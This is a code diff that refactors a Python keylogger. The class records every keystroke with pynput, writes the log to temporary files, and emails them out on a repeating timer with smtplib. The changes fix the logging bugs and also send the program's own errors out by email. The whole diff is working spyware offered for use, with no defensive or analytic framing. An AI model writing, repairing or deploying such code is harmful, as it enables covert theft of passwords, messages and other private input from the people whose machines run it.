@@ -1,3 +1,5 @@
+#This keylogger captures keystrokes with 'pynput' and emails them periodically with 'smtplib'.
+
 import os
 import smtplib
 import tempfile
@@ -15,17 +17,19 @@ class KeyLogger():
         
     def callback(self, key : str) -> None:
         try:
-            log = log + str(key.char)
-            
+            self.log = self.log + str(key.char)
+
         except AttributeError:
             if key == key.space:
-                log += " "
+                self.log += " "
                 
-            else:
-                log = log + f" [{str(key).replace('KEY.', '')}]"
-        except:
-            pass
-        
+            else: 
+                self.log = self.log + f" [{str(key).replace('KEY.', '')}]"
+
+        except Exception as e:
+            temp_file = self.create_temp_file_and_write(message=str(e))
+            self.send_mail(temp_file) 
+                    
     def send_mail(self, file_name : str) -> None:
         host = os.getlogin()
         try:
@@ -56,23 +60,31 @@ class KeyLogger():
             os.remove(file_name)
             
         except Exception as e:
-            print("Error:", e)
+            temp_file = self.create_temp_file_and_write(message=str(e))
+            self.send_mail(temp_file)
+                        
+    def create_temp_file_and_write(self, message : str) -> str:
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
+            temp_file.write(message.encode("utf-8"))
+                
+        return temp_file.name
     
     def thread_function(self) -> None:
         try:
-            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
-                temp_filename = temp_file.name
-                temp_file.write(self.log.encode("utf-8"))
-            
-            self.send_mail(self.email, self.password, temp_filename)
+            temp_file = self.create_temp_file_and_write(message=self.log)
+            self.send_mail(temp_file)
             
             timer_object = threading.Timer(self.timeout, self.thread_function)
             timer_object.start()
             
-        except:
+        except RecursionError as e:
             wait_time = 60
             timer = threading.Timer(wait_time, self.thread_function)
             timer.start()
+            
+        except Exception as e:
+            temp_file = self.create_temp_file_and_write(message=str(e))
+            self.send_mail(temp_file)
         
     def run(self) -> None:
         keyboard_listener : kb.Listene = kb.Listener(on_press=self.callback)
